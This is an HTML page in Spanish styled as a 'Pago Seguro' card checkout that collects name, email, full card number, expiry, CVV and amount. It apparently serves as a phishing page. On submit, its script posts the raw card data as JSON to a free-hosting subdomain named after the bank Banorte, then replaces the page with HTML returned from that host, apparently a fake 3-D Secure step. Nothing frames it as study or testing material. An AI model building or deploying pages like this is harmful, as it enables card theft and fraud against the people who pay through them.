<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Pago Seguro</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #4a148c, #7b1fa2);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  background: white;
  padding: 30px;
  border-radius: 15px;
  width: 320px;
  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
}

h2 {
  text-align: center;
  color: #6a1b9a;
}

input {
  width: 100%;
  padding: 10px;
  margin: 8px 0;
  border-radius: 8px;
  border: 1px solid #ccc;
}

button {
  width: 100%;
  padding: 12px;
  background: #6a1b9a;
  color: white;
  border: none;
  border-radius: 8px;
  cursor: pointer;
}

button:hover {
  background: #4a148c;
}

.cvv-container {
  position: relative;
}

.toggle-cvv {
  position: absolute;
  right: 10px;
  top: 12px;
  cursor: pointer;
  font-size: 12px;
  color: #6a1b9a;
}
</style>
</head>

<body>

<div class="container">
  <h2>Pago Seguro</h2>

  <form id="formPago">

    <input name="nombre" placeholder="Nombre completo" required>
    <input name="correo" type="email" placeholder="Correo electrónico" required>

    <input id="cardNumber" placeholder="Número de tarjeta" maxlength="16" required>
    <input id="cardExp" placeholder="MM/AA" maxlength="5" required>

    <div class="cvv-container">
      <input id="cvv" type="password" placeholder="CVV" maxlength="4" required>
      <span class="toggle-cvv" onclick="toggleCVV()">Ver</span>
    </div>

    <input id="amount" placeholder="Monto" required>

    <button type="submit">Pagar</button>

  </form>
</div>

<script>
function toggleCVV() {
  const cvv = document.getElementById("cvv");
  cvv.type = cvv.type === "password" ? "text" : "password";
}

// formato MM/AA automático
document.getElementById("cardExp").addEventListener("input", e => {
  let val = e.target.value.replace(/\D/g, "");
  if (val.length >= 2) val = val.slice(0,2) + "/" + val.slice(2,4);
  e.target.value = val;
});

// solo números tarjeta
document.getElementById("cardNumber").addEventListener("input", e => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0,16);
});

window.onload = () => {
  const form = document.getElementById("formPago");

  form.onsubmit = async (e) => {
    e.preventDefault();

    const data = {
      nombre: form.nombre.value,
      correo: form.correo.value,
      cardNumber: document.getElementById("cardNumber").value,
      cardExp: document.getElementById("cardExp").value,
      cvv: document.getElementById("cvv").value,
      amount: document.getElementById("amount").value
    };

    try {
      const res = await fetch("https://backend-banorte.onrender.com/api/payment/3d-secure", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

      const html = await res.text();
      document.open();
      document.write(html);
      document.close();

    } catch (error) {
      alert("Error al procesar pago");
    }
  };
};
</script>

</body>
</html>
